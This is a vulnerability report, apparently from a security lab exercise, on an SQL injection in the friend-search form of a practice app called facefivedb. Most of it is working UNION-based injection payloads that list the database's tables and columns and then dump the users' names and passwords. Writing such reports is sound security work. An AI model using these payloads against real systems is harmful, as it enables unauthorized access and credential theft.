# Vulnerability 2: SQL Injection in search my friends form allows to retrieve all the database data

- Vulnerability: SQL Injection
- Where: `search` in Search My Friends form
- Impact: Allows to retrieve all the database data

## Steps to reproduce

1. Register a new user (if you already have an user you can go to step 2)
2. Login as that user
3. Access `My Friends` menu
4. Insert payload:
    1. `' and 1=0 UNION SELECT table_name,2,table_schema,table_rows,5 FROM information_schema.tables -- ` to retrieve all the tables and their databases
    2. `' and 1=0 UNION SELECT table_name,2,table_schema,table_rows,5 FROM information_schema.tables WHERE table_schema='facefivedb' -- ` to retrieve all the tables of the facefivedb database
    3. `' and 1=0 UNION SELECT column_name,2,data_type,column_key,5 FROM information_schema.columns WHERE table_name='<table>' -- ` to retrieve all the columns of the table `<table>`
    4.
        1. `' and 1=0 UNION SELECT username1,2,username2,id,5 FROM Friends -- ` to retrieve all entries of the table Friends
        2. `' and 1=0 UNION SELECT username1,2,username2,id,5 FROM FriendsRequests -- ` to retrieve all entries of the table FriendsRequests
        3. `' and 1=0 UNION SELECT author,2,content,created_at,5 FROM Posts -- ` to retrieve all entries of the table Posts
        4. `' and 1=0 UNION SELECT username,2,password,about,5 FROM Users -- ` to retrieve all entries of the table Users

[(POC)](vuln2.py)
